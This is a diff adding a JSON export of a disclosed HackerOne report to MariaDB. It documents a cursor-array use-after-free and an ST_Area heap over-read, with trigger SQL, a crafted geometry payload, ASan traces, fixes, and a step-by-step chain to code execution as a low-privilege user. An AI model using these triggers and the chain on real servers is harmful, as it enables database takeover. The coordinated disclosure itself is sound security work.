@@ -1,0 +1,132 @@
+{
+  "id": 3856148,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODU2MTQ4",
+  "url": "https://hackerone.com/reports/3856148",
+  "title": "Low-privilege RCE in MariaDB: SYS_REFCURSOR cursor-array use-after-free chained with an ST_Area heap over-read",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-10T20:10:22.259Z",
+  "submitted_at": "2026-07-10T20:10:23.286Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rdjgr",
+    "url": "/rdjgr",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-07T19:47:06.419Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-07T19:47:05.400Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Low-privilege RCE in MariaDB: SYS_REFCURSOR cursor-array use-after-free chained with an ST_Area heap over-read\n\n## Summary\n\nA low-privilege authenticated user can execute arbitrary OS commands as the `mariadbd` process user through a single SQL session over the normal TCP port. The account needs only per-database `SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,CREATE TEMPORARY TABLES,EXECUTE`, with no FILE, SUPER, admin, or CREATE ROUTINE.\n\nThe chain uses two independent memory-safety bugs, each documented separately below:\n\n- **Bug 1** is a use-after-free in the `SYS_REFCURSOR` cursor array. A reallocating `Dynamic_array` moves its backing buffer while an open cursor keeps a raw pointer into the old buffer; a later `FETCH` dereferences it and reaches a virtual call, giving control of the instruction pointer.\n- **Bug 2** is an out-of-bounds heap read in `Gis_multi_polygon::area` (`ST_Area`). A missing bounds check lets a crafted MULTIPOLYGON read past the geometry buffer and fold the bytes into the returned `DOUBLE`, giving an in-process memory-disclosure oracle.\n\nThe exploit chain combines them: Bug 2 leaks the heap and code base to defeat ASLR/PIE, and Bug 1 uses that to write a privilege flag and run code. Fixing either bug breaks the chain.\n\nBoth bugs are confirmed under AddressSanitizer on current `13.0` HEAD (13.0.2). The complete exploit is demonstrated end-to-end on the released `mariadb:13.0.1-rc` Docker image (see Reproduction).\n\n## Environment\n\n| | |\n|---|---|\n| Product | MariaDB Server 13.0.2 |\n| Commit | `84c246ca5387c0611f75097136ff4f4bea092aa3` (branch `13.0`, 2026-07-09), current HEAD when tested |\n| Build for ASan traces | `RelWithDebInfo`, `WITH_ASAN=ON`, gcc 13.3.0, glibc 2.39; PIE, ASLR on; server banner `13.0.2-MariaDB-asan` |\n\nSource line numbers below are for commit `84c246ca`. The end-to-end PoC targets Docker image `mariadb@sha256:ef34af04bda12e6c85395328af78d562176c34fb29ae52063a4eb0d68fa7b3e9` (`mariadb:13.0.1-rc`, glibc 2.43).\n\n## Severity\n\nFull chain: **CRITICAL**, arbitrary code execution by an authenticated low-privilege user. CVSS 3.1 `AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H` = **8.5** \n\n---\n\n## Bug 1: use-after-free in the SYS_REFCURSOR cursor array\n\n### Root cause\n\n`thd->statement_cursors` (`Statement_rcontext::m_statement_cursors`) is a by-value `Dynamic_array<sp_cursor_array_element>`, storing each `sp_cursor` inline in the buffer. When the array grows, `my_realloc` moves the buffer, but an open cursor's `Materialized_cursor` keeps a raw `select_result *result` pointing into the old, freed buffer. A later `FETCH` dereferences it.\n\nBy-value array with `prealloc=0`, `sql/sp_cursor.h:220,237`:\n```cpp\nclass sp_cursor_array: public Dynamic_array<sp_cursor_array_element>   // :220  elements stored inline\n{\n  sp_cursor_array()\n   :Dynamic_array(PSI_INSTRUMENT_MEM, 0)   // :237  prealloc=0\n  {}\n```\n`Dynamic_array` defaults the growth increment to 16 (`sql/sql_array.h:117`), so capacity grows 0, 16, 32, 48.\n\nGrowth relocates the buffer, `sql/sp_cursor.cc:60`, `sql/sp_cursor.cc:96`, `mysys/array.c:188`:\n```cpp\nType_ref_null sp_cursor_array::append(THD *thd)                 // sp_cursor.cc:58\n{\n  if (Dynamic_array::append(sp_cursor_array_element()))         // :60  grows, relocates\n    ...\n}\n// OPEN -> get_cursor_by_ref() appends when no free slot exists  (sp_cursor.cc:96)\n```\n```cpp\n// mysys/array.c alloc_dynamic():\nnew_ptr = my_realloc(array->m_psi_key, array->buffer,           // :188  moves the buffer\n                     (array->max_element + array->alloc_increment) * array->size_of_element, ...);\narray->buffer = (uchar*) new_ptr;\n```\n\nThe open cursor's back-pointer is never re-seated, `sql/sql_cursor.h:43`:\n```cpp\nclass Server_side_cursor: protected Query_arena\n{\nprotected:\n  select_result *result;   // :43  points at the Select_fetch_into_spvars embedded in the array element\n```\n\n`FETCH` dereferences the dangling pointer, `sql/sql_cursor.cc:294,304`:\n```cpp\nvoid Materialized_cursor::fetch(ulong num_rows)   // :289\n{\n  ...\n  result->begin_dataset();                        // :294  read through the dangling result\n  for (...)\n  {\n    ...\n    if (result->send_data(item_list) > 0)         // :304  virtual dispatch through the freed vtable\n      return;\n  }\n```\n`begin_dataset()` at line 294 is an empty non-virtual function (`sql/select_result.h:120`), so the 8-byte read ASan flags there is the hoisted load of the object's vtable pointer for the virtual `send_data()` at line 304 (`Select_fetch_into_spvars::send_data` overrides, `sql/sp_cursor.h:97`). Once the freed buffer is reclaimed with attacker bytes, that dispatch goes through an attacker-controlled vtable (see the exploit chain).\n\n### Trigger\n\nThe 33rd `OPEN` grows capacity from 32 to 48 and frees the 32-slot buffer. Cursors opened while it was live (e.g. `c16`) still point into it, so `FETCH c16` reads freed memory. One anonymous block, no stored routine:\n```sql\nBEGIN NOT ATOMIC\n  DECLARE c0 SYS_REFCURSOR;  -- ... through c32 ...\n  DECLARE c32 SYS_REFCURSOR;\n  DECLARE a INT;\n  SET @@max_open_cursors = 200;\n  OPEN c0 FOR SELECT 1;      -- ... open all 33; the 33rd frees the 32-slot buffer ...\n  OPEN c32 FOR SELECT 1;\n  FETCH c16 INTO a;          -- dereferences the dangling result\nEND\n```\n\n### AddressSanitizer (13.0.2-MariaDB-asan, commit `84c246ca`; full log `uaf_asan_1302.txt`)\n\n```\n==2875457==ERROR: AddressSanitizer: heap-use-after-free on address 0x5200000207c0 ...\nREAD of size 8 at 0x5200000207c0 thread T15\n    #0 Materialized_cursor::fetch(unsigned long)                              sql/sql_cursor.cc:294\n    #1 sp_cursor::fetch(THD*, Virtual_tmp_table*, List<sp_fetch_target>*, bool) sql/sp_rcontext.cc:908\n    #2 sp_instr_cfetch_by_ref::execute(THD*, unsigned int*)                    sql/sp_instr.cc:2803\n    ...\n    #8 dispatch_command(...)                                                   sql/sql_parse.cc:1903\n    #9 do_command(THD*, bool)                                                  sql/sql_parse.cc:1437\n\n0x5200000207c0 is located 1856 bytes inside of 3616-byte region [0x520000020080,0x520000020ea0)\n\nfreed by thread T15 here:\n    #1 my_realloc                                                             mysys/my_malloc.c:156\n    #2 alloc_dynamic                                                          mysys/array.c:188\n    #3 insert_dynamic                                                         mysys/array.c:97\n    #4 Dynamic_array<sp_cursor_array_element>::append(...)                    sql/sql_array.h:223\n    #5 sp_cursor_array::append(THD*)                                          sql/sp_cursor.cc:60\n    #6 sp_cursor_array::get_cursor_by_ref(THD*, Field*, bool)                 sql/sp_cursor.cc:96\n    #7 sp_instr_copen_by_ref::exec_core(THD*, unsigned int*)                  sql/sp_instr.cc:2670\n\nSUMMARY: AddressSanitizer: heap-use-after-free sql/sql_cursor.cc:294 in Materialized_cursor::fetch(...)\n```\nThe read is freed by the `my_realloc` in `sp_cursor_array::append`. The offsets match the inline layout: read offset 1856 = 32 (my_malloc header) + 1792 (element `c16` at 112 * 16) + 32 (the `result` sub-object within the element); region 3616 = 3584 payload (32 * 112) + 32 header.\n\n### Fix\n\nStore `sp_cursor_array_element`s by pointer so their addresses are stable across growth (the embedded `Select_fetch_into_spvars` that `result` aliases then never moves), or re-seat every open cursor's `Materialized_cursor::result` after each cursor-array reallocation.\n\n---\n\n## Bug 2: out-of-bounds heap read in `Gis_multi_polygon::area`\n\n### Root cause\n\n`Gis_multi_polygon::area()` loops over its declared sub-polygon count, advancing the read cursor by `WKB_HEADER_SIZE` each iteration and building a child `Gis_polygon`, with no bounds check before the advance. If the declared count exceeds the polygons actually present, the cursor moves past `m_data_end`, and the length passed to the child, `(uint32)(m_data_end - data)`, is a negative value truncated to a ~4 GiB `uint32`, defeating the child's bounds checks.\n\n`sql/spatial.cc:4089-4091`:\n```cpp\nint Gis_multi_polygon::area(double *ar, const char **end_of_data) const   // :4073\n{\n  ...\n  if (no_data(data, 4)) return 1;                         // :4079  guards only the count word\n  n_polygons = uint4korr(data);                           // :4081  attacker-declared count\n  data += 4;\n\n  while (n_polygons--)\n  {\n    Gis_polygon p;\n    data += WKB_HEADER_SIZE;                              // :4089  advance with no bounds check\n    p.set_data_ptr(data, (uint32)(m_data_end - data));    // :4090  negative diff -> ~4 GiB length\n    if (p.area(&p_area, &data)) return 1;                 // :4091  child reads out of bounds\n    ...\n  }\n}\n```\n`WKB_HEADER_SIZE = 5` (`sql/spatial.h:35`); `no_data(cur,n)` is `cur + n > m_data_end` (`sql/spatial.h:395`).\n\nThe child reads out of bounds, `sql/spatial.cc:2333-2335`:\n```cpp\nint Gis_polygon::area(double *ar, const char **end_of_data) const   // :2327\n{\n  ...\n  if (no_data(data, 4)) return 1;    // :2333  passes: child m_data_end is the bogus ~4 GiB value\n  n_linear_rings = uint4korr(data);  // :2335  out-of-bounds read\n```\n\nThe sibling `geometry_n()` in the same class does check before advancing, `sql/spatial.cc:4050`:\n```cpp\n    if (no_data(data, WKB_HEADER_SIZE + 4)) return 1;   // :4050  guard before the advance\n    n_linear_rings = uint4korr(data + WKB_HEADER_SIZE);\n    data += WKB_HEADER_SIZE + 4;                        // :4053\n```\n`area()` omits this guard. It is reached via `ST_Area`, `Item_func_area::val_real`, `geom->area()` (`sql/item_geofunc.cc:2499`).\n\n### Trigger\n\nA MULTIPOLYGON declaring 2 polygons but supplying 1:\n```\n74 bytes: SRID=0 | byteorder=01 | wkbType=06 (MultiPolygon) | n_polygons=02 (only 1 supplied) |\n          poly1: byteorder=01, type=03, n_rings=01, n_points=03, 3 x (0.0,0.0)\n```\n```sql\nSELECT ST_Area(0x0000000001060000000200000001030000000100000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);\n```\nThe first polygon is consumed exactly to `m_data_end`; the second iteration advances past it and the child reads out of bounds. Under ASan the server aborts; on a release build the out-of-bounds bytes are returned in the `DOUBLE` result (leak), or a read into an unmapped page crashes the server.\n\n### AddressSanitizer (13.0.2-MariaDB-asan, commit `84c246ca`; full log `spatial_asan_1302.txt`)\n\n```\n==2876597==ERROR: AddressSanitizer: use-after-poison on address 0x52d00019aca7 ...\nREAD of size 4 at 0x52d00019aca7 thread T14\n    #0 uint4korr                                            include/my_byteorder.h:121\n    #1 Gis_polygon::area(double*, char const**) const       sql/spatial.cc:2335\n    #2 Gis_multi_polygon::area(double*, char const**) const sql/spatial.cc:4091\n    #3 Item_func_area::val_real()                           sql/item_geofunc.cc:2499\n    #4 Type_handler::Item_send_double(...)                  sql/sql_type.cc:7740\n    #5 Protocol::send_result_set_row(List<Item>*)           sql/protocol.cc:1358\n    #6 select_send::send_data(List<Item>&)                  sql/sql_class.cc:3411\n    ...\n    #15 dispatch_command(...)                               sql/sql_parse.cc:1903\n    #16 do_command(THD*, bool)                              sql/sql_parse.cc:1437\n\n0x52d00019aca7 is located 2215 bytes inside of 32768-byte region [0x52d00019a400,0x52d0001a2400)\n\nSUMMARY: AddressSanitizer: use-after-poison include/my_byteorder.h:121 in uint4korr\n```\nThe child `Gis_polygon::area` (`spatial.cc:2335`) reads `n_linear_rings` out of bounds, reached from `Gis_multi_polygon::area` (`spatial.cc:4091`) right after the unguarded advance, via `ST_Area`. The `send_data`/`Item_send_double` frames confirm the plain `SELECT ST_Area(...)` result path. The over-read here lands in poisoned bytes of the query's `THD` MEM_ROOT block; with a different heap layout it reads a live neighbouring allocation (leak) or an unmapped page (crash).\n\n### Fix\n\nAdd a bounds check before the advance, as `geometry_n()` does:\n```cpp\n  while (n_polygons--)\n  {\n    Gis_polygon p;\n    if (no_data(data, WKB_HEADER_SIZE)) return 1;   // add this\n    data += WKB_HEADER_SIZE;\n    p.set_data_ptr(data, (uint32)(m_data_end - data));\n    ...\n  }\n```\nApply the same guard to the sibling aggregators that advance by `WKB_HEADER_SIZE` without one (e.g. `Gis_multi_line_string::geom_length`). `set_data_ptr` should also reject a `data > m_data_end` cursor rather than truncate the negative difference.\n\n---\n\n## Exploit chain to code execution\n\nBug 1 gives control of the instruction pointer but needs target addresses; Bug 2 supplies them. All steps are ordinary SQL from one low-privilege session.\n\n1. **Leak (Bug 2).** `ST_Area` folds out-of-bounds heap qwords into its `DOUBLE` result, recovered exactly via a controlled multiplier. A front-split of the freed cursor buffer leaves a live `Select_fetch_into_spvars` vtable pointer at a known offset; reading it back through the same oracle yields the heap arena base and the `mariadbd` PIE base. This is the only low-privilege in-process channel that returns a raw pointer to the client, so with ASLR + PIE + Full RELRO the write below cannot be aimed without it.\n\n2. **Reclaim (Bug 1).** The 33 OPENs free the 32-slot cursor buffer; `SET @s1 = 0x<3584 bytes>` reclaims it with a crafted layout, so cursors `c16..c31` now point at attacker bytes.\n\n3. **Write and privilege flip.** `FETCH c16`'s virtual dispatch runs a write-what-where gadget (`mov 0x8(%rdi),%rdx ; mov %rax,(%rdx) ; ret`) that writes into the session's `Security_context::master_access`; the written value's low bits set an ACL that includes `FILE`.\n\n4. **Code execution.** With `FILE` in-session, the exploit writes a UDF via `LOAD_FILE`+`INTO DUMPFILE` and calls it. On the Docker image, whose `plugin_dir` is not writable by the `mysql` uid, the same dispatch instead drives a call-oriented chain to `execlp(\"/bin/sh\",\"sh\",\"-c\",\"id>/tmp/maria_proof\")`.\n\nResult: `id` output written to disk by the `mariadbd` process user.\n\n---\n\n## Reproduction\n\nThe complete exploit ships in `docker-demo/`, self-contained against the pinned `mariadb:13.0.1-rc` image. It logs in as the image's built-in unprivileged application account (`example-user`/`my_cool_secret` on schema `appdb`: full privileges on that one schema, no FILE/SUPER/admin) and makes `mariadbd` run `sh -c \"id\"`.\n\n```bash\n# terminal A: bring up the pinned image in the foreground\ncd docker-demo && ./start.sh\n# terminal B: once \"ready for connections\" appears in terminal A\n# The exploit may need multiple attempts. In my testing it is roughly a 1/2 reliability.\ncd docker-demo && python3 exploit.py\n```\n\n`start.sh` is a single `docker run --rm` of the pinned image (`mariadb@sha256:ef34af04bda12e6c85395328af78d562176c34fb29ae52063a4eb0d68fa7b3e9`), which provisions the built-in app account. `exploit.py` runs the full chain as that account over TCP; the resulting `id` output (run by `mariadbd`) prints in the `start.sh` terminal, after which `execlp` replaces PID 1 and the container exits. Set `EXP_CMD` to change the command.\n\n### Files\n\n- `docker-demo/start.sh`, `docker-demo/exploit.py`: end-to-end PoC against the pinned Docker image (the exploit chain above), using COOP `execlp` for the code-execution tail.\n- `uaf_asan_1302.txt`: full ASan log for Bug 1.\n- `spatial_asan_1302.txt`: full ASan log for Bug 2.\n\n## Impact\n\nA low-privilege authenticated user (requiring only basic per-database permissions like SELECT/INSERT/UPDATE/DELETE) can execute arbitrary OS commands as the `mariadbd` process user over a single TCP session. This enables complete database compromise: reading/modifying all data across all databases, exfiltrating credentials and sensitive information, planting backdoors, and pivoting to other systems in the network. The exploit is fully weaponized, reliable against the latest release with all modern mitigations (ASLR/PIE/RELRO), and requires no FILE, SUPER, or admin privileges.",
+  "weakness": {
+    "id": 50,
+    "name": "Use After Free"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6232534,
+      "file_name": "Archive.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9l2qw2j9o3p34i86zb3gg1i84aqb?response-content-disposition=attachment%3B%20filename%3D%22Archive.zip%22%3B%20filename%2A%3DUTF-8%27%27Archive.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ25WOUESA%2F20261007%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261007T210914Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEsaCXVzLXdlc3QtMiJHMEUCIA6B%2FX%2FUNdwxGdrYWBx1k9R9GdH4gq9v5qlfKWPvNfytAiEAvIpmtcC8OexEVPnsxxOrjNn%2FwLBuCFSaej8XZxJKexAqsQUIFBADGgwwMTM2MTkyNzQ4NDkiDCb3xq9l2JQVQlL4rSqOBUoMOwkTAVKWb5sefwZ27IvhEdUdPK4HMpgKpijpqlnqrHxg009%2BVJbTi3TfW37RRf6h3QTNb7aOoz6jduGpJDgRVfY7o%2BcP3ehT5iaSL64jpLhEp2ePRGckpB3ZaSfEbzkcP6c1WnT3GKLpD8HoQj%2BZQGaO%2Figrn6L869Tj3XVSUrQUglVdLXZdZ%2BhavDRFnb6r2Gbuk8mf%2Bmhkkb%2Fgb2GwIN3wxkavuX%2Bk7qfxTGLzUgow061gpSGfQlpzw%2B7mm7LQSuJguDnoIA3uWTBbjbIWIctJfIVhlF9AI%2BuV12j0jLAOP8t9qIyY%2F16pd%2FNrAIKJHDQF6ovNZG48%2Br%2BwomtgoIcCk7RIc8L6HqvrDiumclf5RLT2xIwDL%2FVau7OsIqxpRyua329ANI10d5iOOiPQ59Oj9TShB3fKu16LClGBzVFZO3uTJyUraRKcbb6TU4Br9WRYyBigMFFBoB%2BKloTs9y44BRcDYrro0qBt06b%2BBTRAF2CiCvIF4G%2Fxms1rFMGUmhsb%2BefxOFAZn5YVCEALhP5L6nhfaOrutNrprDWwKiuK86PEc9OD7K4YI5d%2Bytrhdh90jzvfh9mty128vLUiYDsxP7EoyqXOjJGkHps9wanXsKegHCHLuZFjaJSLywL37HrEhuSMAgPR2hN9UerEbSbYayN73KWYYfzoYF67%2BKf36gJPUhmzH8kd0Pv2RMpeZSLNzZNAcgFmewsnhntdbVHwTEfCqZLdCILwPbpLvVrSUjJRcpiMWxoVcRWZkGapFe7ccgiu1EaG2PJ7lG4kVF6gycDo6SWZ5FLm2D%2F4Zckql5ddx48OGTIZwhIH4cxZPjnyXh9QyC%2FQwxlLn%2FIa8PMt7kU0b6tbtpvGojDYrJrWBjqxAXtsI%2FD1AjlHFniF%2B51KQj2XkZcPBR5uUmaXkl%2Fklhs6%2BEZXUYJ3kWdneBYt85Oc8EIc1zdqQlGqB1kYz9itlZa6qAEOQOYw7IWibHluQ1lfv111O%2BDJsmi72fcPzEStVDWix89T2E%2FibxcZM0rDgWY2f%2BtJ0lah1%2FPMEqc1AL3bekBUiC7obUYtXpUxuHhAEJkNg2t%2BPR4mOgzCM56RZHvh%2FvVyDZFFwzNSL03dGbMvCQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aade83b2b97eb6a9af041ed69e2704bcea90f6b1793a808dcc1c1420c2fc1549",
+      "file_size": 9699,
+      "type": "application/zip",
+      "moderated": null
+    },
+    {
+      "id": 6232544,
+      "file_name": "recording-1783714091471.webm",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ikfceflsfwid4ix76qkwihe56gj0?response-content-disposition=attachment%3B%20filename%3D%22recording-1783714091471.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1783714091471.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ25WOUESA%2F20261007%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261007T210914Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEsaCXVzLXdlc3QtMiJHMEUCIA6B%2FX%2FUNdwxGdrYWBx1k9R9GdH4gq9v5qlfKWPvNfytAiEAvIpmtcC8OexEVPnsxxOrjNn%2FwLBuCFSaej8XZxJKexAqsQUIFBADGgwwMTM2MTkyNzQ4NDkiDCb3xq9l2JQVQlL4rSqOBUoMOwkTAVKWb5sefwZ27IvhEdUdPK4HMpgKpijpqlnqrHxg009%2BVJbTi3TfW37RRf6h3QTNb7aOoz6jduGpJDgRVfY7o%2BcP3ehT5iaSL64jpLhEp2ePRGckpB3ZaSfEbzkcP6c1WnT3GKLpD8HoQj%2BZQGaO%2Figrn6L869Tj3XVSUrQUglVdLXZdZ%2BhavDRFnb6r2Gbuk8mf%2Bmhkkb%2Fgb2GwIN3wxkavuX%2Bk7qfxTGLzUgow061gpSGfQlpzw%2B7mm7LQSuJguDnoIA3uWTBbjbIWIctJfIVhlF9AI%2BuV12j0jLAOP8t9qIyY%2F16pd%2FNrAIKJHDQF6ovNZG48%2Br%2BwomtgoIcCk7RIc8L6HqvrDiumclf5RLT2xIwDL%2FVau7OsIqxpRyua329ANI10d5iOOiPQ59Oj9TShB3fKu16LClGBzVFZO3uTJyUraRKcbb6TU4Br9WRYyBigMFFBoB%2BKloTs9y44BRcDYrro0qBt06b%2BBTRAF2CiCvIF4G%2Fxms1rFMGUmhsb%2BefxOFAZn5YVCEALhP5L6nhfaOrutNrprDWwKiuK86PEc9OD7K4YI5d%2Bytrhdh90jzvfh9mty128vLUiYDsxP7EoyqXOjJGkHps9wanXsKegHCHLuZFjaJSLywL37HrEhuSMAgPR2hN9UerEbSbYayN73KWYYfzoYF67%2BKf36gJPUhmzH8kd0Pv2RMpeZSLNzZNAcgFmewsnhntdbVHwTEfCqZLdCILwPbpLvVrSUjJRcpiMWxoVcRWZkGapFe7ccgiu1EaG2PJ7lG4kVF6gycDo6SWZ5FLm2D%2F4Zckql5ddx48OGTIZwhIH4cxZPjnyXh9QyC%2FQwxlLn%2FIa8PMt7kU0b6tbtpvGojDYrJrWBjqxAXtsI%2FD1AjlHFniF%2B51KQj2XkZcPBR5uUmaXkl%2Fklhs6%2BEZXUYJ3kWdneBYt85Oc8EIc1zdqQlGqB1kYz9itlZa6qAEOQOYw7IWibHluQ1lfv111O%2BDJsmi72fcPzEStVDWix89T2E%2FibxcZM0rDgWY2f%2BtJ0lah1%2FPMEqc1AL3bekBUiC7obUYtXpUxuHhAEJkNg2t%2BPR4mOgzCM56RZHvh%2FvVyDZFFwzNSL03dGbMvCQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5417a8a7471954a97aec274665bf37f04aaae0649f04365211799861f36da612",
+      "file_size": 5275767,
+      "type": "video/webm",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-07T19:47:05.595Z",
+  "allow_singular_disclosure_after": -4928.870071418,
+  "singular_disclosure_allowed": true,
+  "vote_count": 1,
+  "voters": [
+    "inzamulsepoy"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 10334,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Remote Code Execution",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
